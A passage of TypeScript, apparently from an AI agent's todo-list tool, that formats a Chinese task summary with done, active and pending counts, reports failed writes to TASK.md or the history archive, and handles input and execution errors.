        const head = `任务清单（${c.total} 项：${c.done} 完成 / ${c.active} 进行中 / ${c.pending} 待办）`;
        const warnParts = [warn && `TASK.md 写入失败：${warn}`, histWarn && `历史归档写入失败：${histWarn}`]
          .filter((s): s is string => Boolean(s));
        const tail = warnParts.length > 0
          ? `\n（注：${warnParts.join('；')} —— 内存状态仍有效，但存档不完整）`
          : '';
        return toolOk(`${head}\n${store.renderNumbered()}${tail}`);
      } catch (e) {
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        return toolError(`todo 执行失败: ${e instanceof Error ? e.message : String(e)}`);
      }
    },
  }));
}
